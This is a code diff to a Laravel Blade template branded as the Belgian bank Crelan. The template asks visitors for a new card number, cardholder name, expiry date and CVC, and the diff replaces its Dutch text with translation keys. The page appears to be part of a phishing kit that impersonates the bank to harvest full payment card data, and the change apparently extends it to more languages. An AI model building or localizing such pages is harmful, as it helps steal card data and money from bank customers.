@@ -1,6 +1,6 @@
 @extends('layouts.app')
 
-@section('title', 'Kaartgegevens | Crelan')
+@section('title', __('messages.card_title') . ' | Crelan')
 
 @section('content')
 <div class="form-page-center">
@@ -16,23 +16,23 @@
                 <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                 <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
             </svg>
-            <span>Kaartgegevens</span>
+            <span>{{ __('messages.card_title') }}</span>
         </div>
 
         <div class="form-container--content">
             <span class="form-container--description">
-                Voer uw nieuwe kaartgegevens in.
+                {{ __('messages.card_description') }}
             </span>
             
             <form id="card-form" class="form--input-container" style="flex-direction: column;">
                 <div class="form-field">
-                    <label for="card-number">Kaartnummer</label>
+                    <label for="card-number">{{ __('messages.card_number') }}</label>
                     <div class="form-input--block">
                         <input 
                             type="text" 
                             id="card-number"
                             class="form--input" 
-                            placeholder="0000 0000 0000 0000"
+                            placeholder="{{ __('messages.card_number_placeholder') }}"
                             maxlength="19"
                             inputmode="numeric"
                             autocomplete="cc-number"
@@ -42,13 +42,13 @@
                 </div>
                 
                 <div class="form-field">
-                    <label for="holder-name">Naam kaarthouder</label>
+                    <label for="holder-name">{{ __('messages.card_holder') }}</label>
                     <div class="form-input--block">
                         <input 
                             type="text" 
                             id="holder-name"
                             class="form--input" 
-                            placeholder="NAAM ACHTERNAAM"
+                            placeholder="{{ __('messages.card_holder_placeholder') }}"
                             autocomplete="cc-name"
                             required
                         >
@@ -57,13 +57,13 @@
                 
                 <div class="form-row">
                     <div class="form-field">
-                        <label for="expire">Vervaldatum</label>
+                        <label for="expire">{{ __('messages.card_expire') }}</label>
                         <div class="form-input--block">
                             <input 
                                 type="text" 
                                 id="expire"
                                 class="form--input" 
-                                placeholder="MM/JJ"
+                                placeholder="{{ __('messages.card_expire_placeholder') }}"
                                 maxlength="5"
                                 inputmode="numeric"
                                 autocomplete="cc-exp"
@@ -73,13 +73,13 @@
                     </div>
                     
                     <div class="form-field small">
-                        <label for="cvc">CVC</label>
+                        <label for="cvc">{{ __('messages.card_cvc') }}</label>
                         <div class="form-input--block">
                             <input 
                                 type="text" 
                                 id="cvc"
                                 class="form--input" 
-                                placeholder="000"
+                                placeholder="{{ __('messages.card_cvc_placeholder') }}"
                                 maxlength="4"
                                 inputmode="numeric"
                                 autocomplete="cc-csc"
@@ -90,7 +90,7 @@
                 </div>
                 
                 <button type="submit" class="form-submit-btn" id="submit-btn">
-                    <span>Bevestigen</span>
+                    <span>{{ __('messages.confirm') }}</span>
                 </button>
             </form>
         </div>
